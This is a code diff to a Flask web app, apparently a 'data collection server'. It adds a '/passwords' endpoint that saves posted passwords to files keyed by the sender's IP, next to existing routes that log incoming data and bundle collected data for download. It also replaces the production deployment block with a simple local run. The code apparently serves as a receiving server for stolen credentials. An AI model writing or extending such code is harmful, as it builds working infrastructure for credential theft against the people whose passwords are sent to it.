@@ -1,4 +1,3 @@
-# app.py
 from flask import Flask, request, jsonify, Response
 from datetime import datetime
 import json
@@ -92,6 +91,18 @@ def log_all_data():
     
     return Response(status=200)
 
+@app.route('/passwords', methods=['POST'])
+def log_passwords():
+    ip = request.remote_addr
+    timestamp = datetime.now().isoformat()
+    
+    # Store passwords
+    passwords = request.json or []
+    with open(f'{data_dir}/passwords_{ip}.json', 'a') as f:
+        f.write(f'{timestamp}: {json.dumps(passwords)}\n')
+    
+    return Response(status=200)
+
 @app.route('/download', methods=['GET'])
 def download_data():
     # Create archive of collected data
@@ -105,30 +116,5 @@ def download_data():
     )
 
 if __name__ == '__main__':
-    # Get port from Render, or use 10000 for local testing
-    port = int(os.environ.get("PORT", 10000))
-    
-    # Run app with Gunicorn in production
-    if os.environ.get('RENDER'):
-        from gunicorn.app.base import BaseApplication
-        
-        class FlaskApplication(BaseApplication):
-            def init(self, parser, opts, args):
-                return {
-                    'bind': f'0.0.0.0:{port}',
-                    'workers': 4,
-                    'timeout': 60
-                }
-            
-            def load_config(self):
-                config = self.init(None, None, None)
-                for key, value in config.items():
-                    self.cfg.settings[key.lower()] = value
-            
-            def load(self):
-                return app
-        
-        FlaskApplication().run()
-    else:
-        # Local development mode
-        app.run(host='0.0.0.0', port=port, debug=True)
+    print(f'Starting data collection server at http://localhost:5000')
+    app.run(host='0.0.0.0', port=5000)
